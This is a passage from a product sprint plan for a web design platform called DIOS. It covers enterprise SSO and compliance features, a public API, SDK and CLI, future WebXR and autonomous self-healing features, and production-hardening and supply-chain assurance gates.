- **Assigned Canonical Features:** `ENT-003` (`GDPR eu-west-1 Shards`), `ENT-004` (`SCIM 2.0 Provisioning`), `ENT-005` (`AWS KMS CMEK`), `ENT-006` (`HIPAA PHI Shield`), `ENT-007` (`Enterprise Admin Console`), `AUTH-004` (`SAML 2.0 SSO Gateway`), `BIL-006` (`Net-30 PO Gateway`), `ANA-005` (`SIEM Audit Export`), plus `DLC-001..002` (`Data Lifecycle`) (`10 Features`)

### 1. Executive Objectives & Architectural Focus
Activate our dormant `enterprise_orgs` hierarchy (`ENT-01`). Build **SAML 2.0 Single Sign-On (`Okta / Azure AD`)** and **SCIM 2.0 automated user provisioning (`ENT-04`)**. Implement European GDPR data residency routing (`eu-west-1 Dublin shards`), Customer-Managed Encryption Keys (`AWS KMS CMEK`), HIPAA compliance PHI shields (`ENT-06`), and automated SIEM audit log streaming (`Datadog / Splunk`). **EXECUTE `ENTERPRISE` TIER LAUNCH.**

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 9` (`v2.0 Ecosystem` stable baseline, `AUTH-01` Clerk identity, and `DB-02` RLS middleware).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/enterprise/src/sso/*.ts` — SAML 2.0 federation router (`AUTH-004`), Clerk SCIM webhook listener, and exact domain auto-provisioner.
- `packages/enterprise/src/security/*.ts` — AWS KMS envelope encryption utility (`CMEK`) and European data residency routing middleware (`eu-west-1 pooler selector`).
- `apps/web/src/app/enterprise/admin/page.tsx` — Enterprise IT administration console (`/enterprise/admin`), MFA enforcement toggles, and SIEM webhook config.

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Enterprise employee logs in via corporate Okta SAML credentials (`employee@acme.com`); automatically assigned to Acme Enterprise Organization and target department workspace with exact `Admin` or `Editor` role (`AUTH-004`).
2. Employee terminated inside Okta triggers SCIM 2.0 `DELETE` webhook; employee's active DIOS sessions terminate instantly within `< 1 second` (`ENT-04`).
3. Enterprise workspace configured with `residencyRegion: 'eu-west-1'` verifies 100% of PostgreSQL queries, AST snapshots, and edge KV routes execute strictly within European AWS Dublin and Cloudflare EU data centers (`ENT-03`).

### 5. Execution Risks & Testing Strategy
- **Risk:** SCIM webhook race conditions during massive corporate org reorganizations (`1,000+ staff`). **Mitigation:** Process all incoming SCIM webhooks through durable Inngest FIFO job queues (`ENT-04`).
- **Testing:** Comprehensive enterprise compliance audit verifying SAML SSO federation flows across Okta/Azure AD, testing AWS KMS key revocation (`confirming encrypted ASTs become unreadable`), and validating zero outbound US network requests when EU residency is toggled. **EXIT GATE: `Enterprise Tier` CERTIFIED.**

---

# SPRINT 11: HEADLESS API PLATFORM & DEVELOPER SDK (`@dios/sdk`)
- **Assigned Release Bucket:** `Platform` | **Duration:** Months 13–18 (`120 Calendar Days`)
- **Assigned Pods:** `Platform Pod`, `Ecosystem Pod`
- **Assigned Canonical Features:** `SDK-01` (`Headless REST/tRPC API`), `SDK-02` (`@dios/sdk Client Library`), `SDK-03` (`CLI Toolchain`), `AUTH-06` (`Scoped API Key Generator`), `GIT-06` (`CI/CD GitHub Action`), `MKT-06` (`Agency Private Kits`), `PLG-05` (`@dios/plugin-sdk Package`) (`7 Features`)

### 1. Executive Objectives & Architectural Focus
Transform DIOS into an open, programmatic **Headless Developer Platform**. Launch our official npm package (`@dios/sdk`), public REST/tRPC API endpoints (`/api/v1/*`), API key generator (`dios_live_sk_*`), official CLI toolchain (`npx @dios/cli init / deploy`), and custom GitHub Action CI/CD validation package (`@dios/action`). **EXECUTE `PLATFORM SDK` LAUNCH.**

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 10` (`Enterprise Tier` stable, `AUTH-02` RBAC engine, and `PRJ-01` project core).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/sdk/src/*.ts` — Official TypeScript client library (`@dios/sdk`) exposing typed `projects`, `ai`, and `deployments` controllers.
- `packages/cli/src/*.ts` — Command-line toolchain (`@dios/cli`) supporting `dios init`, `dios pull-tokens`, and `dios deploy`.
- `apps/web/src/app/api/v1/[...route]/route.ts` — Public headless REST/tRPC API router authenticated via `Authorization: Bearer` API keys (`SDK-01`).

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. External node script executing `await dios.ai.generateTurn(projectId, "Create a pricing table")` using `@dios/sdk` returns exact mutated `IASTNode` tree and updates project state in `< 3.5 seconds` (`SDK-02`).
2. Running `npx @dios/cli@latest init my-app --project-id=123` in terminal scaffolds a clean local Next.js 15 monorepo linked directly to the user's active DIOS workspace and git branch (`SDK-03`).
3. Developer opening pull request in GitHub triggers `@dios/action`; action runs design token schema validation (`TKN-01`) and blocks PR merge if ad-hoc hex codes or WCAG contrast violations are detected (`GIT-06`).

### 5. Execution Risks & Testing Strategy
- **Risk:** Public API abuse causing sudden AI token billing spikes. **Mitigation:** Enforce strict API key rate limiting (`600 req/min`) inside Upstash Serverless Redis (`INF-01`) and require active metered credit balances (`AUTH-03`) before processing headless AI turns.
- **Testing:** Automated SDK compliance test suite installing `@dios/sdk` inside clean Node.js, Deno, and Cloudflare Worker environments, executing 50 programmatic API mutations, and asserting 100% type safety and successful edge deployments. **EXIT GATE: `Platform SDK Tier` CERTIFIED.**

---

# SPRINT 12: FUTURE FRONTIERS — WEBXR 3D CANVAS & AUTONOMOUS WATCHDOG
- **Assigned Release Bucket:** `Future` | **Duration:** Months 19–24 (`180 Calendar Days`)
- **Assigned Pods:** `Ecosystem Pod`, `AI Pod`, `AST Pod`, `Enterprise Pod`
- **Assigned Canonical Features:** `PRJ-07` (`Spatial Project Root`), `CNV-09` (`3D OrbitControls`), `CNV-10` (`Autonomous Visual Regression`), `AST-08` (`CRDT Collaborative AST`), `AST-09` (`Self-Healing Syntax Loop`), `AI-10` (`A11y/Perf Remediation Loop`), `AI-11` (`Watchdog Self-Healing`), `TKN-06` (`Spatial Tokens`), `DEP-06` (`Air-Gapped Sharder`), `MKT-07` (`AI Remixing Engine`), `ENT-08` (`Air-Gapped Sync Bridge`), `PLG-06` (`AI Plugin Generator`), `SDK-04` (`Batch Generation Loop`), `SDK-05` (`Webhook Subscriptions`), `SDK-06` (`Figma SDK Adapter`), `SDK-07` (`WebXR Spatial SDK`) (`16 Features`)

### 1. Executive Objectives & Architectural Focus
Conquer our long-term **Category Frontiers (`Year 4+ Vision`)**. Launch **Spatial Computing / WebXR 3D Canvas Rendering (`Three.js / React Three Fiber`)** (`CNV-09`, `TKN-06`, `SDK-07`) for Apple Vision Pro and Meta Quest viewports. Activate **Autonomous Multi-Agent Background Site Self-Healing (`Watchdog Loop`)** (`AI-11`), headless agency batch generation (`SDK-04` generating 1,000 sites via CSV), self-hosted air-gapped AWS VPC sharding (`DEP-06`, `ENT-08`), and AI plugin scaffolding agents (`PLG-06`). **EXECUTE `FUTURE FRONTIERS` CATEGORY DOMINANCE.**

### 2. Upstream Dependencies & Prerequisites
- Completion of `Sprint 11` (`Platform SDK` stable, `CNV-01` virtualized canvas, `ORC-01` agent executor, and `DEP-02` edge deployer).

### 3. Physical Deliverables & Code Packages Scaffolding
- `packages/spatial/src/*.ts` — Three.js / React Three Fiber 3D spatial viewport engine, `OrbitControls`, and depth/lux token compiler (`TKN-06`).
- `packages/ai/src/watchdog/monitor.ts` — Autonomous synthetic edge site monitor and self-healing AST repair agent (`AI-11`).
- `packages/deploy/src/sharding/terraform/*.tf` — Complete Terraform and Pulumi infrastructure-as-code scripts for single-tenant air-gapped AWS VPC installations (`DEP-06`).

### 4. Verifiable Acceptance Criteria (`Definition of Done`)
1. Toggling `Viewport: Spatial 3D` inside canvas renders active project AST inside a 3D coordinate space (`Three.js`); mouse dragging rotates camera smoothly around multi-plane UI layers with `< 16.6ms` frame times (`CNV-09`).
2. Synthetic edge watchdog (`AI-11`) detecting a live HTTP 500 error on an external customer site (`*.dios.app`) automatically parses runtime stack trace, invokes Sonnet to generate an `ASTMutationPatch` fix, and publishes updated bundle to Cloudflare R2 inside `< 30 seconds` with zero human intervention.
3. Agency running batch generation script (`await dios.ai.generateBatch(1000_business_csv)`) successfully compiles, styles, and publishes 1,000 unique SEO-optimized local business websites to Cloudflare edge KV (`*.dios.app`) within `< 45 minutes` (`SDK-04`).

### 5. Execution Risks & Testing Strategy
- **Risk:** Watchdog self-healing loop entering recursive deployment loops if third-party API is permanently down. **Mitigation:** Enforce strict circuit breakers inside `AI-11` (Max 1 auto-healing attempt per 24 hours per site; if failure persists, escalate immediately to admin email alert).
- **Testing:** Comprehensive frontier simulation executing WebXR 3D canvas rendering inside WebGL headless browsers, testing autonomous watchdog self-healing against simulated edge JS runtime crashes, and deploying complete air-gapped AWS EKS shards via Terraform inside isolated test VPCs. **EXIT GATE: `Future Frontiers` ACHIEVED. CATEGORY LEADERSHIP SECURED.**

---

---

# SPRINT 7H: PRODUCTION ASSURANCE, RECOVERY & GITHUB RELIABILITY GATE
- **Assigned Release Bucket:** `Production Hardening` | **Duration:** `30 Calendar Days`
- **Assigned Pods:** `Platform Pod`, `AST Pod`, `Canvas Pod`
- **Assigned Canonical Features:** `MIG-001`, `BKP-001`, `SEC-001`, `SEC-002`, `GIT-007`, `GIT-008`, `OPS-001`, `TST-001`, `A11Y-001` (`9 Features`)

### 1. Executive Objectives
Certify the existing architecture for production operation without replacing its stack or module boundaries. Add versioned database migrations, tested PITR restores, credential rotation, GitHub webhook idempotency and drift reconciliation, SLOs, mandatory CI, and WCAG 2.2 AA product-interface gates.

### 2. Dependencies
- Completion of Sprint 7 and a stable Sprint 4 Git synchronization baseline.

### 3. Exit Gate
1. Empty and N-1 databases migrate successfully; an isolated PITR restore completes inside the documented RTO.
2. Duplicate, delayed, missed, and poison GitHub deliveries do not create duplicate commits or lose AST mutations.
3. Force-push, branch deletion, installation suspension, and repository transfer pause or reconcile safely without silent overwrite.
4. Build, real lint, typecheck, test, migration, accessibility, and security checks are required before merge.
5. SLO alerts and incident runbooks pass a game-day exercise.

**Sprint 8 is blocked until Sprint 7H is certified.** Detailed acceptance criteria are defined in `PRODUCTION_HARDENING_PLAN.md`.

---

# SPRINT 10 ASSURANCE ADDENDUM

Add `DLC-001` (retention, deletion, and legal hold) and `DLC-002` (portable DSAR export) to Sprint 10. Enterprise release certification requires verified deletion, backup tombstones, legal-hold behavior, resumable tenant-isolated exports, and audit receipts.

---

# SPRINT 11 ASSURANCE ADDENDUM

Add `API-001` (API compatibility and error contract) and `SEC-003` (software supply-chain integrity and provenance) to Sprint 11. Public API/SDK release is blocked by breaking contract diffs, unsigned artifacts, missing SBOMs, or unresolved high-severity supply-chain findings.

---

*— End of File 5 (Canonical Master Sprint Plan — Sprints 0 through 12 plus mandatory Sprint 7H) —*
